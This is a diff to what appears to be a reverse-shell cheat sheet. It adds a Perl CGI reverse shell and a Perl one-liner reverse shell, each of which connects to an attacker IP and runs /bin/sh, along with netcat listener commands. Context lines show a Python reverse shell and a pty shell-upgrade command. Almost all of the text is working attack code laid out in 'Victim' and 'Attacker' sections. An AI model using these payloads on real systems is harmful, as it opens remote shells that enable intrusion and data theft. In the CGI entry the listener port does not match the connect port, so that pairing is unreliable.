@@ -23,5 +23,29 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 nc -lvp 9000
 
 
+# 4) Perl cgi reverse-shell
+--- Victim: ---
+#!/usr/bin/perl -w
+use Socket;
+my $i="10.11.0.42";
+my $p=443;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+open(STDIN,">&S");
+open(STDOUT,">&S");
+open(STDERR,">&S");
+exec("/bin/sh -i");
+};
+--- Attacker: ---
+nc -lvnp 4444
+
+
+# 5) Perl reverse shell
+--- Victim: ---
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+--- Attacker: ---
+nc -nlvp 1234
+
+
 # Get no limited shell
 python -c 'import pty;pty.spawn("/bin/bash")'
